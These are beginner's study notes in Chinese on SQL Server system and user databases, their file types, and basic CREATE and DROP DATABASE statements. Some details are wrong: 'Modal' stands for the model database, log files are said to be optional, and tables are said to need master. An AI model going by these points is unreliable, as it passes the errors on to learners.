有一个系统数据库：Master，作用是统计、记录我们自己创建的用户数据库的情况。  
有一个系统数据库：Modal，作用是作为一个*数据库模板*，供我们自己创建用户数据库时使用。  
有系统数据库：msdb与tempdb数据库。

b. 用户数据库  
当我们做一个项目的时候，会针对这个项目做一个数据库，为这个项目提供数据的存储、操作等。这个就是用户数据库。  
一个用户数据库中有两种文件：数据文件与日志文件
1. 数据文件：  
 a. 主数据文件(.mdf):有且仅有一个。  
 b. 次数据文件(.ndf):0个或多个。 
2. 日志文件(.ldf):0个或多个。 

1. 为一个项目新建一个数据库。  
a. 图形界面创建  
b. 语句创建，创建数据库、表的时候，一定要使用`master`数据库。
命令语句创建数据库  "--"是单行注释，不区分大小写。  
数据库命令行语法可以去查文档。
>
use master
--create a database
create database student
--delete a database
drop database student
